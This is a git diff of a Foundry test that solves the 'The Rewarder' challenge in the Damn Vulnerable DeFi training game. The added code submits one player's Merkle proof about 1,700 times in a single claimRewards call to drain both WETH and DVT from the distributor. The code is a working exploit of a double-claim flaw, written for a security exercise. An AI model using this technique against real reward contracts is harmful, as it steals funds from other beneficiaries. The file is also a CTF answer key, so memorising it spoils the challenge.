@@ -47,7 +47,7 @@ contract TheRewarderChallenge is Test {
      */
     function setUp() public {
         startHoax(deployer);
-
+        console.log("player address:", player);
         // Deploy tokens to be distributed
         dvt = new DamnValuableToken();
         weth = new WETH();
@@ -149,6 +149,42 @@ contract TheRewarderChallenge is Test {
      */
     function test_theRewarder() public checkSolvedByPlayer {
         
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        
+        (uint256 player_dvt_index, uint256 player_dvt_amount) = _findBeneficiaryIndex("/test/the-rewarder/dvt-distribution.json");
+        (uint256 player_weth_index, uint256 player_weth_amount) = _findBeneficiaryIndex("/test/the-rewarder/weth-distribution.json");
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        Claim[] memory claims = new Claim[](1720);
+
+        // 853 iterations for WETH
+        for (uint i = 0; i < 853; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: player_weth_amount,
+                tokenIndex: 1, // WETH is the second token in the array
+                proof: merkle.getProof(wethLeaves, player_weth_index)
+            });
+        }
+
+        // 867 iterations for DVT
+        for (uint i = 853; i < 1720; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: player_dvt_amount,
+                tokenIndex: 0, // DVT is the first token in the array
+                proof: merkle.getProof(dvtLeaves, player_dvt_index)
+            });
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -186,6 +222,19 @@ contract TheRewarderChallenge is Test {
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
+        }
+    }
+
+    function _findBeneficiaryIndex(
+        string memory path
+    ) private view returns (uint256 index, uint256 amount) {
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+        
+        for (uint256 i = 0; i < rewards.length; i++) {
+            if (rewards[i].beneficiary == address(player)) {
+                return (i, rewards[i].amount);    
+            }
         }
     }
 }
